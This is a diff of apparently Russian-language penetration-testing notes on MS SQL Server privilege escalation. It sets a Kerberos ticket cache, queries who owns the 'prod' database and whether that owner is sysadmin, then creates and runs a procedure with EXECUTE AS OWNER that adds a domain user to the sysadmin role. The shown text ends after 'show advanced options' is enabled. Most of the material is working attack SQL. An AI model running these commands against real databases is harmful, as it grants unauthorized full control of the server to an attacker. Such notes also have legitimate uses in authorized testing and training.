@@ -162,10 +162,12 @@ export KRB5CCNAME=sqlsvc.ccache
 * узнать кто владелец базы данных
   
         SELECT d.name AS DatabaseName, SUSER_SNAME(d.owner_sid) AS DatabaseOwner, IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(d.owner_sid)) AS IsOwnerSysadmin FROM sys.databases d WHERE d.name = 'prod';
+
 * создание процедуры повышения привелегий
 
+      enum_users - кто есть владельцы бд и что за юзеры там
         use prod
-        CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS BEGIN EXEC sp_addsrvrolemember 'FREIGHTLOGISTIC\ron.mcginnis', 'sysadmin' END;	--создание процедуры повышения привелегий
+        CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS BEGIN EXEC sp_addsrvrolemember 'FREIGHTLOGISTIC\ron.mcginnis', 'sysadmin' END;	--создание                     процедуры повышения привелегий
         EXEC sp_elevate_me;
         SELECT IS_SRVROLEMEMBER('sysadmin') AS AmISysadminNow;
         EXEC sp_configure 'show advanced options', 1;
